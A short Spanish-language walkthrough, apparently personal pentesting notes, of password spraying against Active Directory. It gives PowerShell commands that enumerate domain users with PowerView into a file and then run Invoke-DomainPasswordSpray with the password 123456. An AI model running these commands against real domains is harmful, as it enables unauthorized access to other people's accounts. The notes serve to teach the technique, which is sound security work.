
Esta es una técnica que utiliza passwords que han sido filtradas para poder intentar autenticarse en algún usuario del active directory.

Pasos a realizar:

1. Identificar usuarios del dominio.
2. Iniciar el ataque de Password Spraying
3. Ejecutar y Verificar la password del ataque.

Para ver la realización del ataque vamos con un ejemplo:

```powershell
#Vamos al directorio donde están las herramientas
cd C:\Tools
. .\PowerView.ps1
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File user.txt
#Esto nos generará un fichero .txt con los usuarios encotrados.
```

![[Pasted image 20250317090245.png]]


```Powershell
#Para el password sprating vamos a utilizar un script en el direcotorio de /scripts/credentials.

cd Scripts\credentials
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList .\user.txt -Password 123456 -Verbose

#Aquí usamos la password 123456, este ataque requiere de una password filtrada.
```

![[Pasted image 20250317090823.png]]

